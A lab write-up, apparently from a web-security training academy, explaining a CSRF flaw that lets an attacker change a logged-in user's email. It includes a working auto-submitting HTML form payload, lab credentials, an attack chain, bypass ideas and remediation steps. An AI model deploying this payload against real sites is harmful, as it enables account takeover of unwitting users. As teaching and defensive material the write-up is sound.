# 🐞 Lab — CSRF → Change Email (No CSRF Token)

---

## 🧠 🔥 Overview (Full Theory + Insight)

This lab demonstrates a critical **CSRF (Cross-Site Request Forgery)** vulnerability where an attacker forces a logged-in user to change their email without consent.

---

Normally, secure applications include anti-CSRF protections like tokens.

---

However, in this lab:

The application relies **only on cookies for authentication** and does NOT validate request origin.

---

👉 This allows an attacker to forge a request that the server fully trusts.

---

## 🧠 🟦 Core Idea

If a request depends only on cookies → it can be forged from another site

---

## 🧠 🟥 Key Exploit

```
<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>

<script>
document.forms[0].submit();
</script>
```

---

👉 Forces victim browser to send authenticated request

---

## 🔍 🧠 What Is This Topic?

### 🔹 CSRF (Cross-Site Request Forgery)

Tricking a user’s browser into sending a request that performs an action on their behalf

---

## 🧪 🟩 Lab Walkthrough (STEP-BY-STEP)

---

### 🧩 Step 1 — Login

```
Username: wiener
Password: peter
```

---

### 🧩 Step 2 — Perform Action Normally

Go to:

```
My Account → Change Email
```

---

Submit any email

---

### 🧩 Step 3 — Capture Request

```
POST /my-account/change-email

email=test@abc.com
Cookie: session=xyz
```

---

![change-email-request](../images/change-email-request.png)

---

### 🧠 Key Observation

```
No CSRF token present
Only cookie used for authentication
Email parameter is predictable
```

---

👉 Vulnerability confirmed

---

### 🧩 Step 4 — Analyze Behavior

```
Cookie is automatically sent by browser
Server trusts request without validation
```

---

👉 No origin verification

---

### 🧩 Step 5 — Create CSRF Payload

```
<html>
<body>

<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>

<script>
document.forms[0].submit();
</script>

</body>
</html>
```

---

### 🧩 Step 6 — Deliver Exploit

```
Host payload on attacker-controlled page
```

---

### 🧩 Step 7 — Victim Loads Page

```
Browser auto-submits request
Cookie automatically attached
```

---

👉 Email gets changed

---

## 💣 🟨 Payload Breakdown (Easy)

---

### 🔹 Form

```
<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
```

---

Targets vulnerable endpoint

---

### 🔹 Hidden Input

```
<input type="hidden" name="email" value="attacker@evil.com">
```

---

Injects attacker-controlled data

---

### 🔹 Auto Submit Script

```
<script>
document.forms[0].submit();
</script>
```

---

Executes request without user interaction

---

## 🌍 🟥 Real-World Scenarios

---

### 🔥 Scenario 1 — Change Email

```
Attacker changes victim email
→ Password reset
→ Account takeover
```

---

### 🔥 Scenario 2 — Change Password

```
If no old password required
→ Direct takeover
```

---

### 🔥 Scenario 3 — Add Payment Method

```
Victim adds attacker-controlled card
```

---

### 🔥 Scenario 4 — Transfer Funds

```
Banking actions executed silently
```

---

### 🔥 Scenario 5 — Delete Data

```
Permanent loss of user data
```

---

## ⚔️ 🧠 Attack Chain

---

1️⃣ Identify sensitive endpoint  
2️⃣ Check for CSRF token  
3️⃣ Confirm cookie-based auth  
4️⃣ Create malicious form  
5️⃣ Auto-submit request  
6️⃣ Victim visits attacker page  
7️⃣ Action executed as victim  

---

## 🎯 High-Value Endpoints

---

### 🔹 Account Actions

```
/my-account/change-email
/my-account/change-password
```

---

### 🔹 Financial Actions

```
/transfer
/add-payment-method
```

---

### 🔹 APIs

```
/api/update-profile
```

---

### 🔹 Admin Actions

```
/admin/delete-user
```

---

## ⚠️ 🟥 Real-World Limitations + Bypass

---

### ❌ CSRF Token Present

👉 Attack fails

---

### ❌ SameSite Cookies

👉 Cookies not sent

---

### ❌ Origin / Referer Check

👉 Request blocked

---

### ❌ Custom Headers Required

👉 Cannot send via HTML

---

### ✅ Bypass Ideas

```
Find unprotected endpoints
Exploit weak token validation
Use GET-based CSRF
Combine with XSS
```

---

## 🛡️ 🔒 Remediation

---

### 🔴 Root Problem

Authentication relies only on cookies

---

### ✅ Fix 1 — Implement CSRF Tokens

```
Add unique token per request
```

---

### ✅ Fix 2 — Validate Server-Side

```
Reject missing or invalid tokens
```

---

### ✅ Fix 3 — Use SameSite Cookies

```
SameSite=Strict or Lax
```

---

### ✅ Fix 4 — Check Origin / Referer

```
Allow only same-site requests
```

---

### ✅ Fix 5 — Re-authentication

```
Require password for sensitive actions
```

---

### ✅ Fix 6 — Use Custom Headers

```
Only same-origin JS can send them
```

---

## 🧠 🟪 Mental Model

---

CSRF = abusing trust in browser  

Cookies = automatic authentication  

No token = no protection  

---

Attacker cannot read response  
But can force actions  

---

## 🎯 🧠 Final Summary

---

✔ Works when:
- User is logged in  
- Only cookies used  
- No CSRF token  

---

✔ Attack method:

```
Create form → auto-submit → victim loads → request sent
```

---

✔ Result:

Action executed as victim  

---

## 🔥 Final One-Liner

---

CSRF = forcing trusted actions through the victim’s browser
